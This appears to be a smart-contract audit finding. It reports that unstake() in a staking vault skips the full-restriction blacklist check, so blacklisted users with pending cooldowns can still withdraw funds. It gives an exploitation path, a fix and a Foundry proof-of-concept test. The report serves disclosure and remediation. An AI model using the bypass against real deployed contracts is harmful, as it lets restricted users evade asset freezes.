## Title
Blacklisted Users Can Bypass FULL_RESTRICTED_STAKER_ROLE Restrictions by Claiming Pre-Existing Cooldowns

## Summary
The `unstake()` function in `StakediTryCooldown.sol` fails to verify if `msg.sender` has the `FULL_RESTRICTED_STAKER_ROLE` before allowing them to claim their cooldown assets. This enables users who become blacklisted after calling `cooldownShares()` to still withdraw their iTRY tokens, directly violating the intended security model where fully restricted users should be unable to unstake.

## Impact
**Severity**: Medium

## Finding Description
**Location:** `src/token/wiTRY/StakediTryCooldown.sol` - `unstake()` function (lines 80-92)

**Intended Logic:** According to the role definition, `FULL_RESTRICTED_STAKER_ROLE` is "The role which prevents an address to transfer, stake, or unstake." [1](#0-0) 

The `_withdraw()` function in the parent contract properly enforces this by checking all three parties (caller, receiver, owner) for the role and reverting with `OperationNotAllowed()` if any possess it. [2](#0-1) 

**Actual Logic:** The `unstake()` function completely bypasses the restriction check by calling `silo.withdraw()` directly without verifying if `msg.sender` has `FULL_RESTRICTED_STAKER_ROLE`. [3](#0-2) 

The `cooldownShares()` function checks `maxRedeem(msg.sender)` which correctly returns the user's balance at the time of calling. [4](#0-3)  However, once shares are burned and assets are in the silo, there is no enforcement preventing a newly-blacklisted user from claiming them.

**Exploitation Path:**
1. User stakes iTRY tokens to receive wiTRY shares (no restrictions yet)
2. User calls `cooldownShares(shares)` - shares are burned via `_withdraw()` which checks restrictions at that moment, and iTRY is transferred to the silo [5](#0-4) 
3. Blacklist Manager grants user `FULL_RESTRICTED_STAKER_ROLE` via `addToBlacklist(address, true)` [6](#0-5) 
4. After cooldown period expires, user calls `unstake(receiver)` - function does not check for restrictions and successfully withdraws iTRY from the silo

**Security Property Broken:** The `FULL_RESTRICTED_STAKER_ROLE` is designed to prevent users from unstaking, but users can bypass this by having pending cooldowns when blacklisted. The protocol provides `redistributeLockedAmount()` to allow admin to seize shares from fully restricted users, but this is ineffective for assets already in cooldown. [7](#0-6) 

## Impact Explanation
- **Affected Assets**: wiTRY shares in cooldown (converted to iTRY held in the silo)
- **Damage Severity**: Blacklisted users can extract all assets placed in cooldown before restriction was applied. While the iTRY transfer itself is subject to iTRY token's blacklist checks (separate from wiTRY blacklist), users can specify a non-blacklisted receiver address to claim funds. [8](#0-7) 
- **User Impact**: Any user who initiated cooldown before being blacklisted can bypass the restriction. This undermines the protocol's ability to freeze assets of malicious or sanctioned users, as they have a cooldown period window (up to 90 days) to withdraw. [9](#0-8) 

## Likelihood Explanation
- **Attacker Profile**: Any staker who anticipates being blacklisted (e.g., through regulatory action or detected malicious activity)
- **Preconditions**: User must call `cooldownShares()` before being granted `FULL_RESTRICTED_STAKER_ROLE`; cooldown period must elapse
- **Execution Complexity**: Simple - requires only calling `unstake()` after cooldown expires. No complex timing or multi-transaction coordination needed.
- **Frequency**: Can be exploited once per cooldown initiated before blacklisting. A sophisticated attacker could initiate multiple cooldowns at different times to create ongoing windows for fund extraction.

## Recommendation

Add restriction checks to the `unstake()` function to match the protection level of `_withdraw()`:

```solidity
// In src/token/wiTRY/StakediTryCooldown.sol, function unstake, line 80:

// CURRENT (vulnerable):
function unstake(address receiver) external {
    UserCooldown storage userCooldown = cooldowns[msg.sender];
    uint256 assets = userCooldown.underlyingAmount;

    if (block.timestamp >= userCooldown.cooldownEnd || cooldownDuration == 0) {
        userCooldown.cooldownEnd = 0;
        userCooldown.underlyingAmount = 0;

        silo.withdraw(receiver, assets);
    } else {
        revert InvalidCooldown();
    }
}

// FIXED:
function unstake(address receiver) external {
    // Check if msg.sender or receiver has FULL_RESTRICTED_STAKER_ROLE
    if (hasRole(FULL_RESTRICTED_STAKER_ROLE, msg.sender) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)) {
        revert OperationNotAllowed();
    }
    
    UserCooldown storage userCooldown = cooldowns[msg.sender];
    uint256 assets = userCooldown.underlyingAmount;

    if (block.timestamp >= userCooldown.cooldownEnd || cooldownDuration == 0) {
        userCooldown.cooldownEnd = 0;
        userCooldown.underlyingAmount = 0;

        silo.withdraw(receiver, assets);
    } else {
        revert InvalidCooldown();
    }
}
```

**Alternative mitigation:** Consider adding an admin function to cancel/seize cooldowns of fully restricted users, allowing the protocol to redistribute these assets similar to `redistributeLockedAmount()` for active shares.

## Proof of Concept

```solidity
// File: test/Exploit_BlacklistBypassViaCooldown.t.sol
// Run with: forge test --match-test test_BlacklistBypassViaCooldown -vvv

pragma solidity 0.8.20;

import "forge-std/Test.sol";
import "../src/token/wiTRY/StakediTryCooldown.sol";
import "../src/token/iTRY/iTry.sol";

contract Exploit_BlacklistBypassViaCooldown is Test {
    StakediTryV2 vault;
    iTry itry;
    address attacker;
    address admin;
    address blacklistManager;
    
    function setUp() public {
        admin = makeAddr("admin");
        blacklistManager = makeAddr("blacklistManager");
        attacker = makeAddr("attacker");
        
        // Deploy iTRY token
        itry = new iTry();
        itry.initialize(admin, admin);
        
        // Deploy staking vault
        vault = new StakediTryV2(IERC20(address(itry)), admin, admin);
        
        // Grant roles
        vm.prank(admin);
        vault.grantRole(vault.BLACKLIST_MANAGER_ROLE(), blacklistManager);
        
        // Mint iTRY to attacker
        vm.prank(admin);
        itry.mint(attacker, 1000 ether);
    }
    
    function test_BlacklistBypassViaCooldown() public {
        // SETUP: Attacker stakes iTRY
        vm.startPrank(attacker);
        itry.approve(address(vault), 1000 ether);
        vault.deposit(1000 ether, attacker);
        uint256 shares = vault.balanceOf(attacker);
        vm.stopPrank();
        
        // EXPLOIT: Attacker initiates cooldown before being blacklisted
        vm.prank(attacker);
        vault.cooldownShares(shares);
        
        // Attacker is now blacklisted
        vm.prank(blacklistManager);
        vault.addToBlacklist(attacker, true); // true = FULL_RESTRICTED_STAKER_ROLE
        
        // Fast forward past cooldown period
        vm.warp(block.timestamp + 91 days);
        
        // VERIFY: Attacker can still unstake despite being blacklisted
        address receiver = makeAddr("receiver");
        vm.prank(attacker);
        vault.unstake(receiver); // Should revert but doesn't
        
        // Confirm attacker successfully withdrew iTRY
        assertGt(itry.balanceOf(receiver), 0, "Blacklisted user withdrew funds");
        assertEq(vault.cooldowns(attacker).underlyingAmount, 0, "Cooldown was cleared");
    }
}
```

## Notes

The same issue exists in `unstakeThroughComposer()` function in `StakediTryCrosschain.sol`, which also does not check if the `receiver` has `FULL_RESTRICTED_STAKER_ROLE` before allowing withdrawal from cooldown. [10](#0-9)  However, this function is restricted to `COMPOSER_ROLE` so the risk is mitigated by trust assumptions around the composer.

The root cause is that while `maxRedeem(msg.sender)` correctly returns the user's balance at the time `cooldownShares()` is called, there is no mechanism to retroactively invalidate cooldowns when a user becomes restricted. The restriction check in `_withdraw()` only applies during the cooldown initiation phase, not during the claiming phase via `unstake()`.

### Citations

**File:** src/token/wiTRY/StakediTry.sol (L29-30)
```text
    /// @notice The role which prevents an address to transfer, stake, or unstake. The owner of the contract can redirect address staking balance if an address is in full restricting mode.
    bytes32 private constant FULL_RESTRICTED_STAKER_ROLE = keccak256("FULL_RESTRICTED_STAKER_ROLE");
```

**File:** src/token/wiTRY/StakediTry.sol (L126-133)
```text
    function addToBlacklist(address target, bool isFullBlacklisting)
        external
        onlyRole(BLACKLIST_MANAGER_ROLE)
        notOwner(target)
    {
        bytes32 role = isFullBlacklisting ? FULL_RESTRICTED_STAKER_ROLE : SOFT_RESTRICTED_STAKER_ROLE;
        _grantRole(role, target);
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L168-185)
```text
    function redistributeLockedAmount(address from, address to) external nonReentrant onlyRole(DEFAULT_ADMIN_ROLE) {
        if (hasRole(FULL_RESTRICTED_STAKER_ROLE, from) && !hasRole(FULL_RESTRICTED_STAKER_ROLE, to)) {
            uint256 amountToDistribute = balanceOf(from);
            uint256 iTryToVest = previewRedeem(amountToDistribute);
            _burn(from, amountToDistribute);
            _checkMinShares();
            // to address of address(0) enables burning
            if (to == address(0)) {
                _updateVestingAmount(iTryToVest);
            } else {
                _mint(to, amountToDistribute);
            }

            emit LockedAmountRedistributed(from, to, amountToDistribute);
        } else {
            revert OperationNotAllowed();
        }
    }
```

**File:** src/token/wiTRY/StakediTry.sol (L269-273)
```text
        if (
            hasRole(FULL_RESTRICTED_STAKER_ROLE, caller) || hasRole(FULL_RESTRICTED_STAKER_ROLE, receiver)
                || hasRole(FULL_RESTRICTED_STAKER_ROLE, _owner)
        ) {
            revert OperationNotAllowed();
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L24-24)
```text
    uint24 public constant MAX_COOLDOWN_DURATION = 90 days;
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L79-79)
```text
    /// @param receiver Address to send the assets by the staker
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L80-92)
```text
    function unstake(address receiver) external {
        UserCooldown storage userCooldown = cooldowns[msg.sender];
        uint256 assets = userCooldown.underlyingAmount;

        if (block.timestamp >= userCooldown.cooldownEnd || cooldownDuration == 0) {
            userCooldown.cooldownEnd = 0;
            userCooldown.underlyingAmount = 0;

            silo.withdraw(receiver, assets);
        } else {
            revert InvalidCooldown();
        }
    }
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L109-110)
```text
    function cooldownShares(uint256 shares) external ensureCooldownOn returns (uint256 assets) {
        if (shares > maxRedeem(msg.sender)) revert ExcessiveRedeemAmount();
```

**File:** src/token/wiTRY/StakediTryCooldown.sol (L114-117)
```text
        cooldowns[msg.sender].cooldownEnd = uint104(block.timestamp) + cooldownDuration;
        cooldowns[msg.sender].underlyingAmount += uint152(assets);

        _withdraw(msg.sender, address(silo), msg.sender, assets, shares);
```

**File:** src/token/wiTRY/StakediTryCrosschain.sol (L77-101)
```text
    function unstakeThroughComposer(address receiver)
        external
        onlyRole(COMPOSER_ROLE)
        nonReentrant
        returns (uint256 assets)
    {
        // Validate valid receiver
        if (receiver == address(0)) revert InvalidZeroAddress();

        UserCooldown storage userCooldown = cooldowns[receiver];
        assets = userCooldown.underlyingAmount;

        if (block.timestamp >= userCooldown.cooldownEnd) {
            userCooldown.cooldownEnd = 0;
            userCooldown.underlyingAmount = 0;

            silo.withdraw(msg.sender, assets); // transfer to wiTryVaultComposer for crosschain transfer
        } else {
            revert InvalidCooldown();
        }

        emit UnstakeThroughComposer(msg.sender, receiver, assets);

        return assets;
    }
```
